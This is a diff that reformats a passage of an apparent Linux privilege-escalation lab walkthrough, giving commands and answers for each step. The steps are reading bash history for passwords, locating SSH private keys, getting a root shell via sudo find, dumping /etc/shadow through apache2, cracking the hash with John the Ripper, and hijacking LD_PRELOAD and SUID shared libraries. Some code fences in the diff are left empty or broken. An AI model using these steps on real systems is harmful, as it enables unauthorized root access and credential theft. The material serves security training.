@@ -197,15 +197,15 @@ user
 
 ### Step 1 — Read bash history
 ```bash
+cat ~/.bash_history | grep -i pass
 ```
-`cat ~/.bash_history | grep -i pass`
-
 Searches the shell history for commands containing the word “pass”, often revealing credentials.
 
 ### Answer:
 ```bash
+password123
 ```
-`password123`
+
 
 ---
 
@@ -213,15 +213,14 @@ Searches the shell history for commands containing the word “pass”, often re
 
 ### Step 1 — List permissions
 ```bash
+ls -l /etc/shadow
 ```
-`ls -l /etc/shadow`
-
 Displays who can read/write the system’s hashed password file.
 
 ### Answer:
 ```bash
+-rw-rw-r--
 ```
-`-rw-rw-r--`
 
 ---
 
@@ -229,15 +228,13 @@ Displays who can read/write the system’s hashed password file.
 
 ### Step 1 — Search for private SSH keys
 ```bash
+find / -name id_rsa 2>/dev/null
 ```
-`find / -name id_rsa 2>/dev/null`
-
 Searches the entire filesystem for private RSA SSH keys.
-
 ### Answer:
 ```bash
+/backups/supersecretkeys/id_rsa
 ```
-`/backups/supersecretkeys/id_rsa`
 
 ---
 
@@ -245,20 +242,20 @@ Searches the entire filesystem for private RSA SSH keys.
 
 ### Step 1 — Check sudo privileges
 ```bash
+sudo -l
 ```
-`sudo -l`
-
 Lists commands the current user can run as root without a password.
-```bash
-```
-`sudo find . -exec /bin/sh \;`
 
+```bash
+sudo find . -exec /bin/sh \;
+```
 Uses `find`'s `-exec` option to run a root shell.
 
 ### Answer:
 ```bash
+find
 ```
-`find`
+
 
 ---
 
@@ -266,27 +263,25 @@ Uses `find`'s `-exec` option to run a root shell.
 
 ### Step 1 — Abuse Apache config loading
 ```bash
+sudo apache2 -f /etc/shadow
 ```
-`sudo apache2 -f /etc/shadow`
-
-Forces Apache (running as root) to print the contents of `/etc/shadow`.
+```Forces Apache (running as root) to print the contents of `/etc/shadow`.
 
 ### Step 2 — Crack the hash
 ```bash
+echo "<HASH>" > root.hash
 ```
-`echo "<HASH>" > root.hash`
-
 Stores the extracted root hash into a file.
+
 ```bash
+john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-`john root.hash --wordlist=/usr/share/wordlists/rockyou.txt`
-
 Uses John the Ripper to crack the root password.
-
 ### Answer:
 ```bash
+password123
 ```
-`password123`
+
 
 ---
 
@@ -294,9 +289,8 @@ Uses John the Ripper to crack the root password.
 
 ### Step 1 — Create malicious shared object
 ```bash
-```
-`cat << 'EOF' > x.c ... EOF`
 
+```
 Creates a C file that spawns a root shell when loaded.
 
 ### Step 2 — Compile
@@ -309,14 +303,12 @@ Compiles the C file into a shared library (.so) for LD_PRELOAD injection.
 ### Step 3 — Execute with sudo
 ```bash
 ```
-`sudo LD_PRELOAD=/tmp/x.so apache2`
-
 Forces Apache to load your malicious `.so` file before executing.
 
 ### Answer:
 ```bash
+x.so
 ```
-`x.so`
 
 ---
 
@@ -324,37 +316,35 @@ Forces Apache to load your malicious `.so` file before executing.
 
 ### Step 1 — Inspect SUID binary
 ```bash
+strings /usr/local/bin/suid-so
 ```
-`strings /usr/local/bin/suid-so`
-
 Reveals readable strings inside the binary.
-```bash
-```
-`strace /usr/local/bin/suid-so 2>&1 | grep -i open`
 
+```bash
+strace /usr/local/bin/suid-so 2>&1 | grep -i open
+```
 Shows system calls, including attempts to open missing `.so` files.
 
 **Binary looks for:**
 ```bash
+/home/tcm/.config/libcalc.so
 ```
-`/home/tcm/.config/libcalc.so`
 
 ### Step 2 — Create malicious library
 ```bash
+mkdir -p /home/tcm/.config
 ```
-`mkdir -p /home/tcm/.config`
-
 Creates the directory expected by the program.
-```bash
-```
-`cat << 'EOF' > /home/tcm/.config/libcalc.c ... EOF`
 
+```bash
+cat << 'EOF' > /home/tcm/.config/libcalc.c ... EOF
+```
 Creates a malicious `.so` that makes a SUID root bash shell.
 
 ### Step 3 — Compile
 ```bash
+gcc -shared -fPIC -o /home/tcm/.config/libcalc.so /home/tcm/.config/libcalc.c
 ```
-
 Compiles your malicious shared library.
 
 ### Step 4 — Execute SUID binary
